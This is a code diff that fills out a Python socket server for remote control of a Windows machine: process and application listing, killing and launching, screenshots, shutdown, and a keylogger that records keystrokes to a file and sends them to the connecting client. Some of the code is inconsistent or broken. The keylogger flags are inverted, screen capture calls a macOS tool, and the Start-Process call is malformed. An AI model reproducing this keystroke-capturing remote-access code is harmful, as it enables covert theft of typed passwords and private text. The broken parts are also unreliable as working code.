@@ -114,4 +114,166 @@ class Server:
                 process_list = self.get_process_list()
                 self.send_message(process_list)
                 while True:
-                    action = self
+                    action = self.recv_message()
+                    value = self.recv_message()
+                    if action == "Exit":
+                        break
+                    elif action == "Kill":
+                        is_killed = self.kill_process(value)
+                        self.send_message(is_killed)
+                        process_list_updated = self.get_process_list()
+                        self.send_message(process_list_updated)
+                    elif action == "Start":
+                        is_started = self.start_application(value)
+                        self.send_message(is_started)
+                        process_list_updated = self.get_process_list()
+                        self.send_message(process_list_updated)
+            elif message == "APP":
+                application_list = self.get_application_list()
+                self.send_message(application_list)
+                while True:
+                    action = self.recv_message()
+                    value = self.recv_message()
+                    if action == "Exit":
+                        break
+                    elif action == "Kill":
+                        is_killed = self.kill_application(value)
+                        self.send_message(is_killed)
+                        application_list_updated = self.get_application_list()
+                        self.send_message(application_list_updated)
+                    elif action == "Start":
+                        is_started = self.start_application(value)
+                        self.send_message(is_started)
+                        application_list_updated = self.get_application_list()
+                        self.send_message(application_list_updated)
+            elif message == "KEYLOGGER":
+                self.toggle_keylogger()
+                while True:
+                    request = self.recv_message()
+                    if request == "HOOK":
+                        self.keylogger_hooked = False
+                        try:
+                            with open(self.log_path, "w") as log_file:
+                                log_file.write("")
+                        except Exception:
+                            pass
+                    elif request == "UNHOOK":
+                        self.keylogger_hooked = True
+                    elif request == "PRINT":
+                        if not self.keylogger_hooked:
+                            log_contents = self.read_log_file()
+                            self.send_message(log_contents)
+                            try:
+                                with open(self.log_path, "w") as log_file:
+                                    log_file.write("")
+                            except Exception:
+                                pass
+                        else:
+                            self.send_message("\0")
+                    elif request == "DELETE":
+                        pass
+                    elif request == "EXIT":
+                        break
+            elif message == "CAPTURE":
+                self.capture_screen()
+                self.send_file("captureScreen.png")
+            elif message == "SHUTDOWN":
+                self.turn_off()
+            elif message == "OUT":
+                self.client_socket.close()
+                self.server_socket.close()
+                self.server_open = False
+                self.keylogger_hooked = False
+                if self.keylogger_active:
+                    self.toggle_keylogger()
+                break
+
+    def get_process_list(self):
+        try:
+            process_list = subprocess.check_output(["powershell.exe", "gps | select ProcessName,Id,Description"], shell=True)
+            return process_list.decode()
+        except Exception:
+            return ""
+
+    def kill_process(self, pid):
+        try:
+            subprocess.run(["taskkill", "/F", "/PID", pid], check=True)
+            return "Success"
+        except Exception:
+            return "Fail"
+
+    def start_application(self, application_name):
+        try:
+            subprocess.run(["powershell.exe", "gps | Start-Process", application_name], check=True)
+            return "Success"
+        except Exception:
+            return "Fail"
+
+    def get_application_list(self):
+        try:
+            application_list = subprocess.check_output(["powershell.exe", "gps | where {$_.MainWindowTitle } | select ProcessName,Id,Description"], shell=True)
+            return application_list.decode()
+        except Exception:
+            return ""
+
+    def kill_application(self, pid):
+        try:
+            subprocess.run(["taskkill", "/F", "/PID", pid], check=True)
+            return "Success"
+        except Exception:
+            return "Fail"
+
+    def toggle_keylogger(self):
+        if not self.keylogger_active:
+            self.keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
+            self.keyboard_listener.start()
+            self.keylogger_active = True
+        else:
+            if self.keyboard_listener:
+                self.keyboard_listener.stop()
+                self.keylogger_active = False
+
+    def on_key_press(self, key):
+        try:
+            key_text = self.get_key_text(key)
+            if key_text:
+                self.append_to_log(key_text)
+        except AttributeError:
+            pass
+
+    def get_key_text(self, key):
+        if isinstance(key, keyboard.KeyCode):
+            return key.char
+        elif key in Key.__members__.values():
+            return "[" + key.name + "]"
+        return ""
+
+    def append_to_log(self, text):
+        try:
+            with open(self.log_path, "a") as log_file:
+                log_file.write(text)
+        except Exception:
+            pass
+
+    def read_log_file(self):
+        try:
+            with open(self.log_path, "r") as log_file:
+                log_contents = log_file.read()
+            return log_contents
+        except Exception:
+            return ""
+
+    def capture_screen(self):
+        try:
+            os.system("screencapture -R0,0,1920,1080 captureScreen.png")
+        except Exception:
+            pass
+
+    def turn_off(self):
+        try:
+            os.system("shutdown -s -t 1")
+        except Exception:
+            pass
+
+if __name__ == "__main__":
+    Server()
